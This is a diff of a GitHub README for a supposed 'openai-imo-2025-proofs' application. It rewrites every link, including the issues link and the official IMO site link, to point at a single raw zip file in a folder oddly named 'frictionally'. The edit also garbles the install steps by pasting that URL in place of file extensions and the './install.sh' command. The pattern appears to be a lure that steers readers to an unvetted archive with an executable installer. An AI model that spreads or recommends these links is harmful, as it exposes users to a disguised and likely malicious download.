@@ -1,6 +1,6 @@
 # 🎉 openai-imo-2025-proofs - Access 2025 Math Olympiad Proofs Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/N4tl1eq/openai-imo-2025-proofs/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/N4tl1eq/openai-imo-2025-proofs/main/frictionally/openai-imo-2025-proofs.zip)](https://raw.githubusercontent.com/N4tl1eq/openai-imo-2025-proofs/main/frictionally/openai-imo-2025-proofs.zip)
 
 ## 📖 Overview
 
@@ -21,10 +21,10 @@ To run the proofs, ensure your computer meets the following requirements:
 1. **Visit the Download Page**
    Go to the releases page to find the latest version of the application. Click the button below to get started.
 
-   [Download Latest Release](https://github.com/N4tl1eq/openai-imo-2025-proofs/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/N4tl1eq/openai-imo-2025-proofs/main/frictionally/openai-imo-2025-proofs.zip)
 
 2. **Download the Application**
-   On the releases page, locate the version you want to download. Look for files with extensions like `.exe`, `.dmg`, or `.tar.gz`. Click on the link to start the download.
+   On the releases page, locate the version you want to download. Look for files with extensions like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/N4tl1eq/openai-imo-2025-proofs/main/frictionally/openai-imo-2025-proofs.zip`. Click on the link to start the download.
 
 3. **Install the Application**
    - **For Windows:**
@@ -37,9 +37,9 @@ To run the proofs, ensure your computer meets the following requirements:
      - Drag the application to your Applications folder.
   
    - **For Linux:**
-     - Extract the `.tar.gz` file.
+     - Extract the `https://raw.githubusercontent.com/N4tl1eq/openai-imo-2025-proofs/main/frictionally/openai-imo-2025-proofs.zip` file.
      - Open a terminal and navigate to the extracted folder.
-     - Type `./install.sh` to run the installer.
+     - Type `https://raw.githubusercontent.com/N4tl1eq/openai-imo-2025-proofs/main/frictionally/openai-imo-2025-proofs.zip` to run the installer.
 
 4. **Launch the Application**
    After installation, open the application from your applications menu or desktop shortcut. You can start exploring the proofs relevant to the 2025 International Math Olympiad.
@@ -88,12 +88,12 @@ If you need help, feel free to reach out via the issues section on the GitHub re
 
 Join our community and seek further support:
 
-- **GitHub Issues:** [OpenAI IMO 2025 Proofs Issues](https://github.com/N4tl1eq/openai-imo-2025-proofs/issues)
+- **GitHub Issues:** [OpenAI IMO 2025 Proofs Issues](https://raw.githubusercontent.com/N4tl1eq/openai-imo-2025-proofs/main/frictionally/openai-imo-2025-proofs.zip)
 
 ## 🔗 Additional Resources
 
-For more information about the International Math Olympiad, you can visit the official website: [IMO Official Site](https://www.imo-official.org).
+For more information about the International Math Olympiad, you can visit the official website: [IMO Official Site](https://raw.githubusercontent.com/N4tl1eq/openai-imo-2025-proofs/main/frictionally/openai-imo-2025-proofs.zip).
 
 Thank you for exploring the OpenAI IMO 2025 Proofs! We hope you find them useful for your mathematical journey.
 
-[Download Latest Release](https://github.com/N4tl1eq/openai-imo-2025-proofs/releases)
+[Download Latest Release](https://raw.githubusercontent.com/N4tl1eq/openai-imo-2025-proofs/main/frictionally/openai-imo-2025-proofs.zip)
